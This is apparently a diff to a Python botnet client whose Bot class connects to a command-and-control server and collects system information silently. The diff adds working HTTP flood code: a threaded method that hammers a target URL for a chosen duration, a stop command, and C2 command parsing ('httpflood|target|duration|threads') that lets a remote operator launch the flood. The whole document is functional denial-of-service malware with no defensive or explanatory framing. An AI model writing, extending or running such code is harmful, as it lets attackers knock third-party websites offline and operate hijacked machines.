@@ -18,6 +18,8 @@ class Bot:
         self.running = True
         self.process = None
         self.output_buf = []
+        self.flood_active = False
+        self.flood_threads = []
         
         # Get system info silently
         try:
@@ -128,6 +130,40 @@ class Bot:
         except Exception as e:
             return {'status': 'error', 'message': str(e)}
     
+    def http_flood(self, target, duration, threads_count):
+        """HTTP flood attack"""
+        try:
+            self.flood_active = True
+            end_time = time.time() + duration
+            
+            def flood_worker():
+                from urllib.request import urlopen, Request
+                while self.flood_active and time.time() < end_time:
+                    try:
+                        req = Request(target, headers={
+                            'User-Agent': 'Mozilla/5.0',
+                            'Accept': '*/*'
+                        })
+                        urlopen(req, timeout=3)
+                    except:
+                        pass
+            
+            # Start flood threads
+            for i in range(threads_count):
+                t = threading.Thread(target=flood_worker, daemon=True)
+                t.start()
+                self.flood_threads.append(t)
+            
+            return f"HTTP flood started: {threads_count} threads attacking {target} for {duration}s"
+        except Exception as e:
+            return f"Flood error: {str(e)}"
+    
+    def stop_flood(self):
+        """Stop HTTP flood attack"""
+        self.flood_active = False
+        self.flood_threads = []
+        return "Flood stopped"
+    
     def connect(self):
         """Connect to C2"""
         while True:
@@ -172,6 +208,21 @@ class Bot:
                     elif cmd_type == 'download':
                         file_data = cmd_data.get('file_data')
                         result = self.download(command, file_data)
+                    elif cmd_type == 'flood':
+                        # Parse flood command
+                        if command == 'stopflood':
+                            result = {'type': 'normal', 'output': self.stop_flood()}
+                        elif command.startswith('httpflood|'):
+                            parts = command.split('|')
+                            if len(parts) == 4:
+                                target = parts[1]
+                                duration = int(parts[2])
+                                threads = int(parts[3])
+                                result = {'type': 'normal', 'output': self.http_flood(target, duration, threads)}
+                            else:
+                                result = {'type': 'normal', 'output': 'Invalid flood command'}
+                        else:
+                            result = {'type': 'normal', 'output': 'Unknown flood command'}
                     else:
                         result = {'type': 'normal', 'output': 'Unknown command type'}
                     
@@ -217,4 +268,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
